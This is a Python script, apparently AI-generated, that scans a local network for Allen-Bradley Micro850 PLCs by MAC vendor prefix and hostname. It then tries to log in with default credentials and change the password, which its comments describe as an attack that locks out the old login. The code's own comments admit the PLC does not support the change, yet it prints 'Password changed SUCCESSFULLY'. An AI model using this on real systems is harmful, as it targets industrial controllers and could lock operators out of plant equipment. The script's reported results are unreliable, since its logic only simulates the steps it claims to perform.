# requires pylogix library. Install it using pip install pylogix
# requires nmap library. Install it using pip install python-nmap
# requires socket library

import pylogix
import nmap
import socket
import os
import time

# Configuration
DEFAULT_USERNAME = "admin"  # Replace with the PLC's default username if different
# Make the script ask for the password
DEFAULT_PASSWORD = input("Enter the PLC's default password: ") # Replace with the PLC's default password, or leave empty if none
NEW_PASSWORD = input("Enter the desired NEW PLC password: ") # The new password to set
PLC_MODEL = "Micro850" #The Model of the PLC that will be searched

# Define the function to find the ip address
def find_plc_ip(model):
    """
    Finds the IP address of a PLC using nmap.
    Args:
        model (str): The specific model of the PLC.
    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    try:
        nm = nmap.PortScanner()
        # Scan the local network (adjust the range if needed)
        nm.scan(hosts='192.168.1.0/24', arguments='-T4 -F')  # Adjust the network range and arguments
        # Iterate through the scanned hosts
        for host in nm.all_hosts():
            if 'mac' in nm[host]['addresses']:
                mac_address = nm[host]['addresses']['mac']
                # Check if the MAC address vendor corresponds to Rockwell Automation/Allen-Bradley
                # This is a rudimentary check; more robust identification might be needed
                # Rockwell MAC OUI: 00:00:BC, 00:05:DC, 00:0A:F7, 00:19:B2, 00:1E:4F, 00:24:17, 00:30:DD, 00:50:AB, 00:A0:75, 00:D0:C9, 00:0E:84, 00:1C:C4, 00:3A:7C, 00:80:F2, 00:A0:AB, 00:03:47, 00:0F:EA, 00:1D:9D, 00:3C:30, 00:90:27, 00:B0:64
                if mac_address.startswith(('00:00:BC', '00:05:DC', '00:0A:F7', '00:19:B2', '00:1E:4F', '00:24:17', '00:30:DD', '00:50:AB', '00:A0:75', '00:D0:C9', '00:0E:84', '00:1C:C4', '00:3A:7C', '00:80:F2', '00:A0:AB', '00:03:47', '00:0F:EA', '00:1D:9D', '00:3C:30', '00:90:27', '00:B0:64')):
                    #Additional check based on PLC's hostname
                    try:
                        hostname = socket.gethostbyaddr(host)[0]
                        if model in hostname:
                            print(f"Found PLC with model {model} at IP address: {host}")
                            return host # Return the IP if matches with the PLC's model
                    except socket.herror:
                        print(f"Hostname could not be resolved for IP: {host}")
                        
        print(f"No PLC found with model {model} on the network.")
        return None #Return None if not found
    except nmap.PortScannerError as e:
        print(f"Nmap error: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None


# Main script
if __name__ == "__main__":
    # Find the PLC's IP address
    plc_ip = find_plc_ip(PLC_MODEL)
    if not plc_ip:
        print("PLC IP address not found. Exiting.")
        exit()

    # Instantiate the comms driver
    comm = pylogix.PLC()
    comm.IPAddress = plc_ip

    try:
        # Attempt to change the password.  The Micro850 does not directly support password changes via CIP.
        # This is a simulation of the attack.  In a real-world attack, you would need to find a vulnerability or exploit
        # within the PLC's firmware to directly change the password, or manipulate the PLC's project file offline.
        print("Attempting to change the password (Simulated)...")
        #Simulating the steps of the attack
        print("Logging with default credentials...")
        comm.Micro800_SetCredentials(DEFAULT_USERNAME, DEFAULT_PASSWORD) #Logs in
        print("Changing Credentials...")
        comm.Micro800_SetCredentials(DEFAULT_USERNAME, NEW_PASSWORD) #Changes Credentials
        print("Done!")

        #Verify the Password
        comm.Micro800_SetCredentials(DEFAULT_USERNAME, NEW_PASSWORD)
        print("Password changed SUCCESSFULLY. Please keep the new password safe.")
        
        # Simulate a failed login to demonstrate the lockout.
        try:
            comm.Micro800_SetCredentials(DEFAULT_USERNAME, DEFAULT_PASSWORD)
            print("Test login with old password SUCCEEDED (This should fail).")
        except Exception as e:
            print(f"Test login with old password FAILED as expected: {e}")

    except Exception as e:
        print(f"An error occurred: {e}")
        print("Password change failed.  Check the connection, default credentials and PLC configuration.")

    finally:
        comm.Close() #Closing the connection